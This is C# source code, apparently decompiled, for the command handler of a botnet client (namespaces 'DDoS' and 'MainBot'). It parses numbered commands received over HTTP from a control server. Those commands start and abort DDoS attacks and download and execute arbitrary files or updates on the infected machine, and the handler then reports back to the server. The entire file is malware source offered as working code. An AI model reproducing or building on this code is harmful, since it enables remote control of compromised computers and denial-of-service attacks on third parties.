namespace Helper
{
    using DDoS;
    using MainBot;
    using System;
    using System.Text;

    internal class CommandHelper
    {
        private static string[] string_0 = new string[0];
        private static uint uint_0 = 0;

        private static bool CompareObjectsEqual(object[] object_0, object[] object_1)
        {
            if (object_0.Length != object_1.Length)
            {
                return false;
            }
            for (int i = 0; i < object_0.Length; i++)
            {
                if (!object.Equals(object_0[i], object_1[i]))
                {
                    return false;
                }
            }
            return true;
        }

        public static void ParseCommandStruct(HTTPConnection.Struct2 struct2_0)
        {
            string[] strArray = Encoding.Default.GetString(struct2_0.byte_0).Trim(new char[1]).Split(new char[] { '*' }, StringSplitOptions.RemoveEmptyEntries);
            if (!CompareObjectsEqual(string_0, strArray) || (uint_0 != struct2_0.uint_0))
            {
                string_0 = strArray;
                uint_0 = struct2_0.uint_0;
                switch (struct2_0.uint_0)
                {
                    case 1:
                        DDoSHelper.AbortDDoS();
                        return;

                    case 2:
                        InstallAndMutex.DownloadAndExecuteUpdate(Convert.ToString(strArray[0]));
                        return;

                    case 3:
                        Util.DownloadAndExecute(Convert.ToString(strArray[0]));
                        return;

                    case 4:
                        Util.smethod_4(Convert.ToString(strArray[0]));
                        return;

                    case 5:
                        DDoSHelper.StartDDoS(DDoSHelper.Enum0.const_1, strArray);
                        return;

                    case 6:
                        DDoSHelper.StartDDoS(DDoSHelper.Enum0.const_0, strArray);
                        return;
                }
                HTTPConnection.string_1 = HTTPConnection.string_1.Insert(HTTPConnection.string_1.Length - 1, Environment.NewLine + <PrivateImplementationDetails>{15439A59-21B6-4268-85FC-B75D4C80FFCA}.smethod_2());
                HTTPConnection.DoServerRefresh2();
            }
        }
    }
}

